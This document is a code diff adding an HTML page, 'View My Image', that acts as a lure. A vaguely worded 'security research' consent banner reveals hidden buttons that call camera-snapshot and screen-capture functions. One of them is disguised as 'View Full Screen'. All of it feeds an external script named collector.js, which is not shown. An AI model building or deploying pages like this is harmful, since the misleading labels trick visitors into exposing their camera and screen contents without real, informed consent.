@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>View My Image</title>
+</head>
+<body>
+    <h1>Check out this cool image!</h1>
+    <img src="image.jpg" alt="Sample Image" width="500">
+    
+    <!-- Consent Banner -->
+    <div id="consentBanner" style="border: 1px solid #ccc; padding: 10px; margin: 10px;">
+        <p>This site collects anonymized data for security research. Click "Accept" to continue.</p>
+        <button onclick="acceptConsent()">Accept</button>
+    </div>
+
+    <!-- Hidden Buttons (Will appear after consent) -->
+    <button onclick="requestCameraSnapshot()" id="cameraBtn" style="display: none;">Enable Camera</button>
+    <button onclick="requestScreenCapture()" id="screenBtn" style="display: none;">View Full Screen</button>
+
+    <!-- Load JavaScript -->
+    <script src="collector.js"></script>
+</body>
+</html>
